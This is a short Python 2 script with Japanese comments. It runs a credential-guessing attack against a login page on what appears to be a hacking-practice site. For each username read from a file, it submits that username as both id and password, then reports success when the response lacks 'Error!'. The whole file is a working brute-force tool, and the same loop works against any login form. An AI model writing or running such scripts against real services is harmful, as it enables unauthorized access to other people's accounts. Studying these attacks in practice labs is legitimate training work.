import urllib2,urllib

def main():
    #リスト取り込み
    userfile = open('id_data.txt')
    users = userfile.read().split("\n")
    userfile.close
    cnt = 0;
    print "###### START ######"
    try:
        for user in users:
            print "Trying %s:%s:" % (cnt,user)
            param = {"id":user,"pass":user}
            url = "http://www.hackerschool.jp/hack/take55_attack.php"
            response = urllib2.urlopen(url,urllib.urlencode(param))
            html = response.read()
            #ログイン成功ページにError!はないと思われ
            if "Error!" not in html:
                print "SUCCESS! id and pass is %s\n" % user
                break
            cnt = cnt + 1#カウントしておく
    except:
        print "Error! %s " % cnt
    finally:
        print "###### END ######"


if __name__ == '__main__':
    main()